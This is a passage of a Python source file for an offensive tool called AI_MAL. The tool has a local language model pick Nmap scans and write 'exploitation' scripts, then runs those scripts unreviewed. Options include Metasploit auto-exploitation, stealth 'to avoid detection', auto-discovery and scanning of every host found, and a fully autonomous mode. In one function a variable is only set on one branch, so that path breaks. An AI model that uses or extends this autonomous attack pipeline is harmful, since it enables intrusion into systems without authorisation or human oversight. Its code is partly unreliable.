        return "\n".join(context)

    def call_ollama(self, prompt):
        """
        Call the Ollama API with a prompt and return the response
        
        Args:
            prompt (str): The prompt to send to Ollama
            
        Returns:
            str: The response text from Ollama
        """
        try:
            self.logger.debug(f"Sending prompt to Ollama model {self.ollama_model}")
            
            # Make API request to local Ollama instance
            response = requests.post(
                'http://localhost:11434/api/generate',
                json={
                    'model': self.ollama_model,
                    'prompt': prompt,
                    'stream': False
                },
                timeout=60
            )
            
            # Check for success
            if response.status_code == 200:
                data = response.json()
                return data.get('response', '')
            else:
                self.logger.error(f"Error from Ollama API: {response.status_code} - {response.text}")
                return ""
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error connecting to Ollama API: {str(e)}")
            self.logger.debug(traceback.format_exc())
            return ""
        except Exception as e:
            self.logger.error(f"Unexpected error in Ollama API call: {str(e)}")
            self.logger.debug(traceback.format_exc())
            return ""

    def parse_ollama_response(self, response):
        """Parse Ollama response to extract Nmap parameters."""
        if not response:
            return []
        
        # Clean up the response
        lines = response.strip().split('\n')
        
        # Look for lines that start with nmap or -
        for line in lines:
            line = line.strip()
            if line.startswith('nmap '):
                # Remove 'nmap ' prefix and split into parameters
                return line[5:].split()
            elif line.startswith('-') and ' ' in line:
                # This looks like Nmap parameters, split it
                return line.split()
        
        # Fallback: just return all non-empty lines joined and split by spaces
        all_text = ' '.join([l.strip() for l in lines if l.strip()])
        return all_text.split()

    def get_open_ports_from_history(self):
        """Get a comma-separated list of open ports from scan history."""
        if not self.scan_history:
            return ""
        
        open_ports = set()
        
        for scan in self.scan_history:
            summary = scan.get('result_summary', {})
            if isinstance(summary, dict) and 'open_ports' in summary:
                for port_key in summary['open_ports'].keys():
                    port = port_key.split('/')[0]  # Extract port number from "port/protocol"
                    open_ports.add(port)
        
        return ','.join(sorted(open_ports, key=int)) if open_ports else ""

    def generate_custom_script(self, script_type="bash", target_info=None):
        """
        Generate a custom script based on scan results using Ollama
        
        Args:
            script_type (str): Type of script to generate (bash, python, ruby)
            target_info (dict): Target information to use for script generation
            
        Returns:
            str: Path to the generated script
        """
        if not self.custom_scripts:
            self.logger.warning("Custom script generation is disabled")
            return None
            
        self.logger.info(f"Generating custom {script_type} script based on scan results")
        
        # Use target_info if provided, otherwise use the current target
        if target_info is None:
            current_target = self.target
            target_info = self.summarize_results(self.run_nmap_scan(self.generate_scan_parameters(1)))
        
        # Prepare data for the model
        scan_summary = json.dumps(target_info, indent=2)
        
        # Construct the prompt
        prompt = f"""
        You are a cybersecurity expert writing custom scripts for reconnaissance and analysis.
        
        Based on the following scan results, create a useful {script_type} script that could help a security professional
        analyze this system further or extract more information. Include detailed comments and a clear summary at the beginning.
        Make sure to start the script with a clear description of what it does in a comment section titled "SCRIPT SUMMARY".
        
        Scan Results:
        {scan_summary}
        
        Create a complete, ready-to-use {script_type} script that is useful for further analysis or exploitation.
        """
        
        try:
            # Prepare model
            self.logger.debug(f"Calling Ollama model: {self.ollama_model}")
            
            # Get script content from Ollama
            script_content = self.call_ollama(prompt)
            
            if not script_content:
                self.logger.error("Failed to generate script content")
                return None
                
            # Extract code block if present
            code_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
            code_match = re.search(code_pattern, script_content)
            if code_match:
                script_content = code_match.group(1).strip()
            
            # Create output directory if it doesn't exist
            os.makedirs("generated_scripts", exist_ok=True)
            
            # Determine file extension
            extension = {
                "bash": "sh",
                "python": "py",
                "ruby": "rb"
            }.get(script_type.lower(), "txt")
            
            # Generate a filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            target_str = current_target.replace('.', '_').replace(':', '_')
            script_filename = f"generated_scripts/{script_type}_{target_str}_{timestamp}.{extension}"
            
            # Write the script to file
            with open(script_filename, "w") as f:
                f.write(script_content)
            
            # Make the script executable
            if script_type.lower() != "python":
                os.chmod(script_filename, os.stat(script_filename).st_mode | stat.S_IEXEC)
            
            self.logger.info(f"Custom script generated: {script_filename}")
            
            # Extract summary from the script
            summary_pattern = r"SCRIPT SUMMARY[:\s]*(.*?)(?:\n\n|\n#|\n$)"
            summary_match = re.search(summary_pattern, script_content, re.IGNORECASE | re.DOTALL)
            
            summary = "No summary available"
            if summary_match:
                summary = summary_match.group(1).strip()
                # Clean up the summary (remove comment marks and extra whitespace)
                summary = re.sub(r'^#\s*', '', summary, flags=re.MULTILINE)
                summary = re.sub(r'\n\s*#\s*', ' ', summary)
                summary = re.sub(r'\s+', ' ', summary).strip()
            
            # Print summary to console
            print(f"\n{'-'*80}")
            print(f"GENERATED SCRIPT: {os.path.basename(script_filename)}")
            print(f"TYPE: {script_type}")
            print(f"SUMMARY: {summary}")
            print(f"LOCATION: {os.path.abspath(script_filename)}")
            print(f"{'-'*80}\n")
            
            return script_filename
        except Exception as e:
            self.logger.error(f"Error generating custom script: {str(e)}")
            self.logger.debug(traceback.format_exc())
            return None

    def execute_generated_script(self, script_path, args=None):
        """
        Execute a generated script
        
        Args:
            script_path (str): Path to the script to execute
            args (list): Optional arguments to pass to the script
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not self.execute_scripts:
            self.logger.warning("Script execution is disabled")
            return False
            
        if not script_path or not os.path.exists(script_path):
            self.logger.error(f"Script not found: {script_path}")
            return False
            
        try:
            # Determine how to execute based on file extension
            extension = os.path.splitext(script_path)[1].lower()
            
            cmd = []
            if extension == '.py':
                cmd = ['python3', script_path]
            elif extension in ['.sh', '.bash']:
                cmd = ['bash', script_path]
            elif extension == '.rb':
                cmd = ['ruby', script_path]
            else:
                # Default to direct execution if it's executable
                cmd = [script_path]
                
            # Add any arguments
            if args:
                if isinstance(args, list):
                    cmd.extend(args)
                else:
                    cmd.append(str(args))
                    
            # Print execution information
            print(f"\n{'-'*80}")
            print(f"EXECUTING SCRIPT: {os.path.basename(script_path)}")
            print(f"COMMAND: {' '.join(cmd)}")
            print(f"{'-'*80}\n")
            
            # Execute the script
            self.logger.info(f"Executing script: {' '.join(cmd)}")
            
            # Set up process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Handle output in real-time
            print("SCRIPT OUTPUT:")
            print(f"{'-'*40}")
            
            # Real-time output handling
            for line in process.stdout:
                print(line, end='')  # Print to console
                self.logger.debug(f"Script output: {line.strip()}")
                
            # Get return code
            return_code = process.wait()
            
            # Print any errors
            stderr_output = process.stderr.read()
            if stderr_output:
                print(f"\nERROR OUTPUT:")
                print(f"{'-'*40}")
                print(stderr_output)
                self.logger.warning(f"Script error output: {stderr_output}")
                
            print(f"{'-'*40}")
            print(f"Script completed with return code: {return_code}")
            print(f"{'-'*80}\n")
            
            return return_code == 0
            
        except Exception as e:
            self.logger.error(f"Error executing script: {str(e)}")
            self.logger.debug(traceback.format_exc())
            print(f"\nERROR: Failed to execute script: {str(e)}")
            return False

def main():
    parser = argparse.ArgumentParser(description="Adaptive Nmap scanner with Ollama and Metasploit integration")
    # Optional target
    parser.add_argument("target", nargs="?", help="Target IP address or hostname (optional if --auto-discover is used)")
    parser.add_argument("--model", default="qwen2.5-coder:7b",
                        help="Ollama model to use (default: qwen2.5-coder:7b, alternatives: llama3)")
    parser.add_argument("--iterations", type=int, default=3, help="Maximum number of scan iterations (default: 3)")
    parser.add_argument("--continuous", action="store_true", help="Run in continuous mode until manually stopped")
    parser.add_argument("--delay", type=int, default=2, help="Delay in seconds between scans (default: 2)")
    parser.add_argument("--msf", action="store_true", help="Enable Metasploit integration")
    parser.add_argument("--exploit", action="store_true", help="Automatically attempt exploitation using Metasploit")
    parser.add_argument("--workspace", default="adaptive_scan", help="Metasploit workspace name (default: adaptive_scan)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode for scans to avoid detection")
    parser.add_argument("--auto-script", action="store_true", help="Auto-generate and run Metasploit resource scripts")
    parser.add_argument("--full-auto", action="store_true", help="Full autonomous mode (implies --continuous --msf --exploit --auto-script)")
    parser.add_argument("--quiet", action="store_true", help="Reduce verbosity of output")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    
    # Network discovery options
    parser.add_argument("--auto-discover", action="store_true", help="Automatically discover network and hosts")
    parser.add_argument("--interface", help="Network interface to use for discovery")
    parser.add_argument("--scan-all", action="store_true", help="Scan all discovered hosts (implies --auto-discover)")
    parser.add_argument("--network", help="Specific network to scan in CIDR notation (e.g., 192.168.1.0/24)")
    parser.add_argument("--host-timeout", type=int, default=1, help="Timeout in seconds for host discovery (default: 1)")
    
    # Script generation options
    parser.add_argument("--custom-scripts", action="store_true", help="Enable AI-powered custom script generation")
    parser.add_argument("--script-type", choices=["bash", "python", "ruby"], default="bash", 
                        help="Type of custom script to generate (default: bash)")
    parser.add_argument("--execute-scripts", action="store_true", 
                        help="Automatically execute generated scripts (use with caution)")
    
    # Version information
    parser.add_argument("--version", action="store_true", help="Show version information and exit")
    
    args = parser.parse_args()
    
    # Display version if requested
    if args.version:
        print("AI_MAL Adaptive Nmap Scanner version 1.0.0")
        print("Copyright (c) 2024")
        sys.exit(0)
    
    # Set logging level
    if args.debug:
        logger.setLevel(logging.DEBUG)
    elif args.quiet:
        logger.setLevel(logging.WARNING)
    
    # Full auto mode implications
    if args.full_auto:
        args.continuous = True
        args.msf = True
        args.exploit = True
        args.auto_script = True
        args.custom_scripts = True
    
    # Network discovery implications
    if args.scan_all:
        args.auto_discover = True
    
    # Check if we have a target or auto-discover
    if not args.target and not args.auto_discover:
        logger.error("Error: Either a target must be specified or --auto-discover must be enabled")
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner with appropriate options
    scanner = AdaptiveNmapScanner(
        target=args.target,
        ollama_model=args.model,
        max_iterations=args.iterations,
        continuous=args.continuous,
        delay=args.delay,
        msf_integration=args.msf,
        exploit=args.exploit,
        msf_workspace=args.workspace,
        stealth=args.stealth,
        auto_script=args.auto_script,
        quiet=args.quiet,
        debug=args.debug,
        auto_discover=args.auto_discover,
        interface=args.interface,
        scan_all=args.scan_all,
        network=args.network,
        host_timeout=args.host_timeout,
        custom_scripts=args.custom_scripts,
        script_type=args.script_type,
        execute_scripts=args.execute_scripts
    )
    
    # Additional setup for network option
    if args.network and scanner.network_discovery:
        scanner.network_discovery.network = args.network
        logger.info(f"Using specified network: {args.network}")
    
    # Start scanning
    scanner.run()

if __name__ == "__main__":
    main() 